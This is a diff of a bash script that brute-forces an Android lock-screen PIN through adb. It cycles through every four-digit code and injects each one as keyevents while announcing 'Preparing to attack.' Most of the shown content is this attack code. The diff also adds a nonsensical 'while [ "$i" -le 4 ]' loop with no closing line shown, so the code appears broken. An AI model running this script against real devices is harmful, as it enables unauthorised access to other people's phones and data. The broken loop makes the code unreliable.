@@ -1,3 +1,5 @@
+#!/bin/bash
+
 screen="$(adb shell dumpsys activity|grep -i mCurrentFocus|awk 'NR==1{print $3}'|cut -d'}' -f1)"
 case $screen in
     "mScreenState=OFF") echo -e "Preparing to attack."; 
@@ -13,6 +15,7 @@ do
     for i in {0000..9999}; do
         if [[ $i != 1036 ]]; then
             echo -e "\e[0;1mTrying pin:  $i\e[0m"
+            while [ "$i" -le 4 ]; do
             for (( j=0; j<${#i}; j++ )); do
                 adb shell input keyevent $((`echo ${i:$j:1}`+7))
             done
